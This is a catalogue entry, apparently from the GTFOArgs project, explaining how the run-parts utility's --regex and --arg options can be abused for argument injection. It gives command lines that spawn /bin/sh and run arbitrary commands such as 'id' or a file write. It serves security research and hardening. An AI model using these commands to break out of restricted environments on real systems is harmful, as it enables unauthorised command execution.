---
title: run-parts
description: |
  `run-parts` executes all executable files in a directory whose names
  match specific constraints. With `--regex`, you can precisely select a
  target binary already present on the system (e.g., `sh`) and use it to
  spawn an interactive shell or run arbitrary commands. This technique was
  proposed in issue #1 and confirmed as in-scope for GTFOArgs; the
  `less`/`LESSOPEN` example from the same thread is **not** considered
  argument injection (it relies on an environment variable rather than
  arguments). Note that some implementations (e.g., BusyBox) do **not**
  support `--regex`; Debian/Ubuntu `run-parts` (from `debianutils`) does,
  and also supports `--arg` for passing arguments to the invoked binary.

functions:
  shell:
    - description: Spawn an interactive shell by matching `/bin/sh`.
      code: |
        run-parts --new-session --regex '^sh$' /bin
  command:
    - description: Execute an arbitrary command via `sh -c <cmd>` using `--arg`.
      code: |
        run-parts --regex '^sh$' --arg -c --arg 'id' /bin
    - description: Run a command that writes a file (example uses `echo`).
      code: |
        run-parts --regex '^sh$' --arg -c --arg 'echo pwned > /tmp/owned' /bin
---
